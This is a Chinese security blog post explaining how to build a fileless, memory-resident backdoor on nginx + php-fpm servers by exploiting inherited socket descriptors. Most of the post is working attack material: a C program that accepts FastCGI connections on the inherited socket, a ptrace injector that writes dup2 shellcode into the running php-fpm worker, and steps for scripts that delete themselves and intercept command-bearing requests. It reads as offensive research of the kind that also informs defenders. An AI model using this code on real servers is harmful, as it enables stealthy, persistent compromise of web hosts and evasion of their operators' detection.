<!DOCTYPE html><html lang="en"><head><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black-translucent" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="description" content="A blog containing some interesting things."><meta name="referrer" content="no-referrer"><title>php-fpm环境的一种后门实现 | Beeeの零碎事</title><link rel="stylesheet" type="text/css" href="/css/style.css?v=0.0.0"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/normalize/8.0.0/normalize.min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/pure-min.css"><link rel="stylesheet" type="text/css" href="//cdn.bootcss.com/pure/1.0.0/grids-responsive-min.css"><link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css"><script type="text/javascript" src="//cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script><link rel="Shortcut Icon" type="image/x-icon" href="/favicon.ico"><link rel="apple-touch-icon" href="/apple-touch-icon.png"><link rel="apple-touch-icon-precomposed" href="/apple-touch-icon.png"><link rel="alternate" type="application/atom+xml" href="/atom.xml"></head><body><div class="body_container"><div id="header"><div class="site-name"><h1 class="hidden">php-fpm环境的一种后门实现</h1><a id="logo" href="/.">Beeeの零碎事</a><p class="description">Just so so~</p></div><div id="nav-menu"><a class="current" href="/."><i class="fa fa-home"> Home</i></a><a href="/archives/"><i class="fa fa-archive"> Archive</i></a><a href="/about/"><i class="fa fa-user"> About</i></a><a href="/atom.xml"><i class="fa fa-rss"> RSS</i></a></div></div><div class="pure-g" id="layout"><div class="pure-u-1 pure-u-md-3-4"><div class="content_container"><div class="post"><h1 class="post-title">php-fpm环境的一种后门实现</h1><div class="post-meta">Nov 1, 2018</div><div class="post-content"><p>之前发到安全客上的一篇文章，同步到博客来。</p>
<hr>
<p>目前常见的php后门基本需要文件来维持（常规php脚本后门：一句话、大马等各种变形；WebServer模块：apache扩展等，需要高权限并且需要重启WebServer），或者是脚本运行后删除自身，利用死循环驻留在内存里，不断主动外连获取指令并且执行。两者都无法做到无需高权限、无需重启WeServer、触发后删除脚本自身并驻留内存、无外部进程、能主动发送控制指令触发后门（避免内网无法外连的情况）。</p>
<p>而先前和同事一块测试Linux下面通过/proc/PID/fd文件句柄来利用php文件包含漏洞时，无意中发现了一个有趣的现象。经过后续的分析，可以利用其在特定环境下实现受限的无文件后门，效果见动图:</p>
<p><img src="https://ws2.sinaimg.cn/large/006tNc79ly1fz0hmoo4lrg30ju0clnnl.gif" alt=""></p>
<h3 id="测试环境"><a href="#测试环境" class="headerlink" title="测试环境"></a>测试环境</h3><p>CentOS 7.5.1804 x86_64<br>nginx + php-fpm(监听在tcp 9000端口)</p>
<p>为了方便观察，建议修改php-fpm默认pool的如下参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># /etc/php-fpm.d/www.conf</span><br><span class="line">pm.start_servers = 1</span><br><span class="line">pm.min_spare_servers = 1</span><br><span class="line">pm.max_spare_servers = 1</span><br></pre></td></tr></table></figure>
<p>修改后重启php-fpm，可以看到只有一个master进程和一个worker进程：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost php-fpm.d]# ps -ef|grep php-fpm</span><br><span class="line">nginx     2439 30354  0 18:40 ?        00:00:00 php-fpm: pool www</span><br><span class="line">root     30354     1  0 Oct15 ?        00:00:37 php-fpm: master process (/etc/php-fpm.conf)</span><br></pre></td></tr></table></figure>
<h3 id="php-fpm文件句柄泄露"><a href="#php-fpm文件句柄泄露" class="headerlink" title="php-fpm文件句柄泄露"></a>php-fpm文件句柄泄露</h3><p>在利用php-fpm运行的php脚本里，使用system()等函数执行外部程序时，由于php-fpm没有使用FD_CLOEXEC处理句柄，导致fork出来的子进程会继承php-fpm进程的所有文件句柄。</p>
<p>简单测试代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// t1.php</span><br><span class="line">system(&quot;sleep 60&quot;);</span><br></pre></td></tr></table></figure>
<p>观察访问前worker进程的文件句柄：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost php-fpm.d]# ls -al /proc/2439/fd</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 nginx nginx  0 Oct 24 18:54 .</span><br><span class="line">dr-xr-xr-x 9 nginx nginx  0 Oct 24 18:40 ..</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:54 0 -&gt; socket:[1168542]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:54 1 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:54 2 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:54 7 -&gt; anon_inode:[eventpoll]</span><br><span class="line">[root@localhost php-fpm.d]#</span><br></pre></td></tr></table></figure>
<p>确定socket:[1168542]为php-fpm监听的9000端口的socket句柄：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost php-fpm.d]# lsof -i:9000</span><br><span class="line">COMMAND   PID  USER   FD   TYPE  DEVICE SIZE/OFF NODE NAME</span><br><span class="line">php-fpm  2439 nginx    0u  IPv4 1168542      0t0  TCP localhost:cslistener (LISTEN)</span><br><span class="line">php-fpm 30354  root    6u  IPv4 1168542      0t0  TCP localhost:cslistener (LISTEN)</span><br></pre></td></tr></table></figure>
<p>访问t1.php后，会阻塞在system调用里，此时查看sleep进程与worker进程的文件句柄：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost php-fpm.d]# ps -ef|grep sleep</span><br><span class="line">nginx     2547  2439  0 18:57 ?        00:00:00 sleep 60</span><br><span class="line"></span><br><span class="line">[root@localhost php-fpm.d]# ls -al /proc/2547/fd</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 nginx nginx  0 Oct 24 18:58 .</span><br><span class="line">dr-xr-xr-x 9 nginx nginx  0 Oct 24 18:57 ..</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:58 0 -&gt; socket:[1168542]</span><br><span class="line">l-wx------ 1 nginx nginx 64 Oct 24 18:58 1 -&gt; pipe:[1408640]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:58 2 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:58 3 -&gt; socket:[1408425]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:58 7 -&gt; anon_inode:[eventpoll]</span><br><span class="line"></span><br><span class="line">[root@localhost php-fpm.d]# ls -al /proc/2439/fd</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 nginx nginx  0 Oct 24 18:54 .</span><br><span class="line">dr-xr-xr-x 9 nginx nginx  0 Oct 24 18:40 ..</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:54 0 -&gt; socket:[1168542]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:54 1 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:54 2 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:58 3 -&gt; socket:[1408425]</span><br><span class="line">lr-x------ 1 nginx nginx 64 Oct 24 18:58 4 -&gt; pipe:[1408640]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 24 18:54 7 -&gt; anon_inode:[eventpoll]</span><br></pre></td></tr></table></figure>
<p>可以发现请求t1.php后，nginx发起了一个fast-cgi请求到php-fpm进程，即woker进程里3号句柄<code>socket:[1408425]</code>。同时可以看到sleep继承了父进程php-fpm的0 1 2 3 7号句柄，其中的0号句柄也就是php-fpm监听的9000端口的socket句柄。</p>
<h3 id="文件句柄泄露的利用"><a href="#文件句柄泄露的利用" class="headerlink" title="文件句柄泄露的利用"></a>文件句柄泄露的利用</h3><p>在子进程里有了继承来的socket句柄，就可以直接使用accept函数直接从该socket接受一个连接。下面是一个用于验证的简单c程序以及调用的php脚本：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">// test.c</span><br><span class="line">// gcc -o test test.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;sys/socket.h&gt;</span><br><span class="line">#include &lt;netinet/in.h&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">     int sockfd, newsockfd, clilen;</span><br><span class="line">     struct sockaddr_in cli_addr;</span><br><span class="line">     clilen = sizeof(cli_addr);</span><br><span class="line">     sockfd = 0;    //直接使用0句柄作为socket句柄</span><br><span class="line">     </span><br><span class="line">     //这里accept会阻塞，接受连接后才会执行system()</span><br><span class="line">     newsockfd = accept(sockfd, (struct sockaddr *) &amp;cli_addr, &amp;clilen);</span><br><span class="line">     system(&quot;/bin/touch /tmp/lol&quot;);</span><br><span class="line"></span><br><span class="line">     return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// t2.php</span><br><span class="line">system(&quot;/tmp/test&quot;);</span><br></pre></td></tr></table></figure>
<p>访问t2.php后，观察php-fpm进程以及子进程状态：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost html]# ps -ef|grep php-fpm</span><br><span class="line">nginx     2548 30354  0 Oct24 ?        00:00:00 php-fpm: pool www</span><br><span class="line">nginx     2958 30354  0 11:07 ?        00:00:00 php-fpm: pool www</span><br><span class="line">root     30354     1  0 Oct15 ?        00:00:40 php-fpm: master process (/etc/php-fpm.conf)</span><br><span class="line"></span><br><span class="line">[root@localhost html]# ps -ef|grep test</span><br><span class="line">nginx     2957  2548  0 11:07 ?        00:00:00 /tmp/test</span><br><span class="line"></span><br><span class="line">[root@localhost html]# strace -p 2548</span><br><span class="line">strace: Process 2548 attached</span><br><span class="line">read(4,</span><br><span class="line"></span><br><span class="line">[root@localhost html]# strace -p 2957</span><br><span class="line">strace: Process 2957 attached</span><br><span class="line">accept(0,</span><br><span class="line"></span><br><span class="line">[root@localhost html]# strace -p 2958</span><br><span class="line">strace: Process 2958 attached</span><br><span class="line">accept(0,</span><br></pre></td></tr></table></figure>
<p>可以看到php-fpm多了一个worker进程，子进程test(pid:2957)阻塞在accept函数，所以解析t2.php的这个worker进程(pid:2548)阻塞在php的system函数里，系统调用体现为阻塞在read()，即等待system函数返回。因此master进程spawn出新的worker进程来处理正常的fast-cgi请求，此时php-fpm监听在tcp 9000的这个socket句柄上有两个进程在accept等待新的连接，一个是正常的php-fpm worker(pid:2958)进程，另一个是我们的测试程序test。</p>
<p>此时我们请求一个php页面，nginx发起的到9000端口的fast-cgi请求就会有一定几率被我们的test进程accpet接受到。但是我们测试程序test里面没有处理fast-cgi请求，因此nginx直接向前端返回500。查看tmp目录发现生成了lol文件，说明test进程成功通过accept函数从继承来的socket句柄中接受了一个来自nginx的fast-cgi请求。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost html]# ls -al /tmp/systemd-private-165040c986624007be902da008f27727-php-fpm.service-6HI0kT/tmp/</span><br><span class="line">total 12</span><br><span class="line">drwxrwxrwt 2 root  root    29 Oct 25 11:27 .</span><br><span class="line">drwx------ 3 root  root    17 Oct 15 10:40 ..</span><br><span class="line">-rw-r--r-- 1 nginx nginx    0 Oct 25 11:27 lol</span><br><span class="line">-rwxr-xr-x 1 root  root  8496 Oct 25 10:42 test</span><br></pre></td></tr></table></figure>
<p>至此，我们利用思路就有了：</p>
<ol>
<li>php脚本先删除自身，然后用system()等方法运行一个外部程序</li>
<li>外部程序起来后删除自身，驻留在内存里，直接accpet从0句柄接受来自nginx的fast-cgi请求</li>
<li>解析fast-cgi请求，如果含有特定的指令，拦截请求并执行相应的代码，否则认为是正常请求，转发到9000端口让正常的php-fpm worker处理</li>
</ol>
<p>这个利用思路的缺点是需要起一个外部的进程。</p>
<h3 id="一个另类的利用方法"><a href="#一个另类的利用方法" class="headerlink" title="一个另类的利用方法"></a>一个另类的利用方法</h3><p>到了这里铺垫写完了，进入本文分享的重点部分：如何解决上文提到的需要单独起一个进程来处理fast-cgi请求的不足。</p>
<p>php-fpm解析php脚本，是在php-fpm的worker进程里进行的，也就是说理论上php代码是能访问到worker进程已经打开的文件句柄的。但是php对这块做了封装，在php里通过fopen、socket_create等操作文件、socket时，得到的是一个php resource，每个resource绑定了相应的文件句柄，我们是无法直接操作到文件句柄的。可以通过下面的php脚本简单观察一下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// t3.php</span><br><span class="line">sleep(10);</span><br><span class="line">$socket = socket_create( AF_INET, SOCK_STREAM, SOL_TCP );</span><br><span class="line">sleep(10);</span><br></pre></td></tr></table></figure>
<p>访问t3.php后，查看php-fpm worker进程的文件句柄：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost html]# ls -al /proc/2958/fd</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 nginx nginx  0 Oct 25 11:16 .</span><br><span class="line">dr-xr-xr-x 9 nginx nginx  0 Oct 25 11:07 ..</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 11:16 0 -&gt; socket:[1168542]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 11:16 1 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 11:16 2 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 12:11 3 -&gt; socket:[1428118]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 11:16 7 -&gt; anon_inode:[eventpoll]</span><br><span class="line"></span><br><span class="line">[root@localhost html]# ls -al /proc/2958/fd</span><br><span class="line">total 0</span><br><span class="line">dr-x------ 2 nginx nginx  0 Oct 25 11:16 .</span><br><span class="line">dr-xr-xr-x 9 nginx nginx  0 Oct 25 11:07 ..</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 11:16 0 -&gt; socket:[1168542]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 11:16 1 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 11:16 2 -&gt; /dev/null</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 12:11 3 -&gt; socket:[1428118]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 12:11 4 -&gt; socket:[1428132]</span><br><span class="line">lrwx------ 1 nginx nginx 64 Oct 25 11:16 7 -&gt; anon_inode:[eventpoll]</span><br></pre></td></tr></table></figure>
<p>可以看到10秒内只有来自nginx的fast-cgi请求的3号句柄。而10秒后，4号句柄为php脚本中创建的socket，对应php脚本中的$socket资源。</p>
<p>如果我们能在php代码中构造出一个和0号句柄绑定的socket resource，我们就能直接用php的accpet()来处理来自nginx的fast-cgi请求而无需再起一个新的进程。但是翻遍了资料，最后发现php里无法用常规的方式构造指向特定文件句柄的resource。</p>
<p>但是我们发现worker进程在/proc/下面的文件owner并不是root，而是php-fpm的运行用户。这说明了php-fpm的master在fork出worker进程后，没有正确处理其dumpable flag，导致了我们可以用php-fpm worker的运行用户的权限附加到worker上，对其进行操作。</p>
<p>那么我们就有了新的利用思路：</p>
<ol>
<li>php脚本运行后先删除自身</li>
<li>php脚本里用socket_create()创建一个socket</li>
<li>php脚本释放一个外部程序，使用system()调用，此时子进程继承worker进程的运行权限</li>
<li>子进程attach到父进程(php-fpm worker)，向父进程中注入shellcode，使用dup2()系统调用将0号句柄复制到步骤2中所创建的socket对应的句柄号，并恢复worker进程状态后detach，退出</li>
<li>子进程退出后，php代码里已经可以通过我们创建的socket resource来操作0号句柄，对其使用accept获取来自nginx的fast-cgi连接</li>
<li>解析fast-cgi请求，如果含有特定的指令，拦截请求并执行相应的代码，否则认为是正常请求，转发到9000端口让正常的php-fpm worker处理</li>
</ol>
<p>通过这个利用方法，我们可以将大部分代码都用php实现，并且最终也是以一个被注入过的php-fpm进程的形式存在于服务器上。外部c程序只是用于注入worker进程，复制文件句柄。以下为注入shellcode的c代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br></pre></td><td class="code"><pre><span class="line">// dup04.c</span><br><span class="line">// gcc -o dup04 dup04.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;memory.h&gt;</span><br><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line">#include &lt;sys/wait.h&gt;</span><br><span class="line">#include &lt;sys/user.h&gt;</span><br><span class="line"></span><br><span class="line">void *freeSpaceAddr(pid_t pid) &#123;</span><br><span class="line">    FILE *fp;</span><br><span class="line">    char filename[30];</span><br><span class="line">    char line[850];</span><br><span class="line">    long addr;</span><br><span class="line">    char str[20];</span><br><span class="line">    char perms[5];</span><br><span class="line">    sprintf(filename, &quot;/proc/%d/maps&quot;, pid);</span><br><span class="line">    fp = fopen(filename, &quot;r&quot;);</span><br><span class="line">    if(fp == NULL)</span><br><span class="line">        exit(1);</span><br><span class="line">    while(fgets(line, 850, fp) != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">        sscanf(line, &quot;%lx-%*lx %s %*s %s %*d&quot;, &amp;addr, perms, str);</span><br><span class="line"></span><br><span class="line">        if(strstr(perms, &quot;x&quot;) != NULL)</span><br><span class="line">        &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(fp);</span><br><span class="line">    return addr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ptraceRead(int pid, unsigned long long addr, void *data, int len) &#123;</span><br><span class="line">    long word = 0;</span><br><span class="line">    int i = 0;</span><br><span class="line">    char *ptr = (char *)data;</span><br><span class="line"></span><br><span class="line">    for (i=0; i &lt; len; i+=sizeof(word), word=0) &#123;</span><br><span class="line">        if ((word = ptrace(PTRACE_PEEKTEXT, pid, addr + i, NULL)) == -1) &#123;;</span><br><span class="line">            printf(&quot;[!] Error reading process memory\n&quot;);</span><br><span class="line">            exit(1);</span><br><span class="line">        &#125;</span><br><span class="line">        ptr[i] = word;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ptraceWrite(int pid, unsigned long long addr, void *data, int len) &#123;</span><br><span class="line">    long word = 0;</span><br><span class="line">    int i=0;</span><br><span class="line"></span><br><span class="line">    for(i=0; i &lt; len; i+=sizeof(word), word=0) &#123;</span><br><span class="line">        memcpy(&amp;word, data + i, sizeof(word));</span><br><span class="line">        if (ptrace(PTRACE_POKETEXT, pid, addr + i, word) == -1) &#123;;</span><br><span class="line">            printf(&quot;[!] Error writing to process memory\n&quot;);</span><br><span class="line">            exit(1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[]) &#123;</span><br><span class="line">    void *freeaddr;</span><br><span class="line">    //int pid = strtol(argv[1],0,10);</span><br><span class="line">    int pid = getppid();</span><br><span class="line">    int status;</span><br><span class="line">    struct user_regs_struct oldregs, regs;</span><br><span class="line">    memset(&amp;oldregs, 0, sizeof(struct user_regs_struct));</span><br><span class="line">    memset(&amp;regs, 0, sizeof(struct user_regs_struct));</span><br><span class="line"></span><br><span class="line">    char shellcode[] = &quot;\x90\x90\x90\x90\x90\x6a\x21\x58\x48\x31\xff\x6a\x04\x5e\x0f\x05\xcc&quot;;</span><br><span class="line"></span><br><span class="line">    unsigned char *oldcode;</span><br><span class="line"></span><br><span class="line">    // Attach to the target process</span><br><span class="line">    ptrace(PTRACE_ATTACH, pid, NULL, NULL);</span><br><span class="line">    waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line"></span><br><span class="line">    // Store the current register values for later</span><br><span class="line">    ptrace(PTRACE_GETREGS, pid, NULL, &amp;oldregs);</span><br><span class="line">    memcpy(&amp;regs, &amp;oldregs, sizeof(struct user_regs_struct));</span><br><span class="line"></span><br><span class="line">    oldcode = (unsigned char *)malloc(sizeof(shellcode));</span><br><span class="line"></span><br><span class="line">    // Find a place to write our code to</span><br><span class="line">    freeaddr = (void *)freeSpaceAddr(pid) + sizeof(long);</span><br><span class="line"></span><br><span class="line">    // Read from this addr to back up our code</span><br><span class="line">    ptraceRead(pid, (unsigned long long)freeaddr, oldcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line">    // Write our new stub</span><br><span class="line">    //ptraceWrite(pid, (unsigned long long)freeaddr, &quot;/tmp/inject.so\x00&quot;, 16);</span><br><span class="line">    //ptraceWrite(pid, (unsigned long long)freeaddr+16, &quot;\x90\x90\x90\x90\x90\x90\x90&quot;, 8);</span><br><span class="line">    ptraceWrite(pid, (unsigned long long)freeaddr, shellcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line">    // Update RIP to point to our code</span><br><span class="line">    regs.rip = (unsigned long long)freeaddr + 2;</span><br><span class="line"></span><br><span class="line">    // Set regs</span><br><span class="line">    ptrace(PTRACE_SETREGS, pid, NULL, &amp;regs);</span><br><span class="line"></span><br><span class="line">    //sleep(5);</span><br><span class="line">    // Continue execution</span><br><span class="line">    ptrace(PTRACE_CONT, pid, NULL, NULL);</span><br><span class="line">    waitpid(pid, &amp;status, WUNTRACED);</span><br><span class="line"></span><br><span class="line">    // Ensure that we are returned because of our int 0x3 trap</span><br><span class="line">    if (WIFSTOPPED(status) &amp;&amp; WSTOPSIG(status) == SIGTRAP) &#123;</span><br><span class="line">        // Get process registers, indicating if the injection suceeded</span><br><span class="line">        ptrace(PTRACE_GETREGS, pid, NULL, &amp;regs);</span><br><span class="line"></span><br><span class="line">        if (regs.rax != 0x0) &#123;</span><br><span class="line">            printf(&quot;[*] Syscall for dup2 success.\n&quot;);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            printf(&quot;[!] Library could not be injected\n&quot;);</span><br><span class="line">            return 0;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        //// Now We Restore The Application Back To It&apos;s Original State ////</span><br><span class="line"></span><br><span class="line">        // Copy old code back to memory</span><br><span class="line">        ptraceWrite(pid, (unsigned long long)freeaddr, oldcode, sizeof(shellcode));</span><br><span class="line"></span><br><span class="line">        // Set registers back to original value</span><br><span class="line">        ptrace(PTRACE_SETREGS, pid, NULL, &amp;oldregs);</span><br><span class="line"></span><br><span class="line">        // Resume execution in original place</span><br><span class="line">        ptrace(PTRACE_DETACH, pid, NULL, NULL);</span><br><span class="line">        printf(&quot;[*] Resume proccess.\n&quot;);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        printf(&quot;[!] Fatal Error: Process stopped for unknown reason\n&quot;);</span><br><span class="line">        exit(1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>代码中注入的部分参考自网上，shellcode功能很简单，通过syscall调用dup2(0,4)，汇编为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"> 5:	6a 21                	pushq  $0x21</span><br><span class="line"> 7:	58                   	pop    %rax</span><br><span class="line"> 8:	48 31 ff             	xor    %rdi,%rdi</span><br><span class="line"> b:	6a 04                	pushq  $0x4</span><br><span class="line"> d:	5e                   	pop    %rsi</span><br><span class="line"> e:	0f 05                	syscall </span><br><span class="line">10:	cc                   	int3</span><br></pre></td></tr></table></figure>
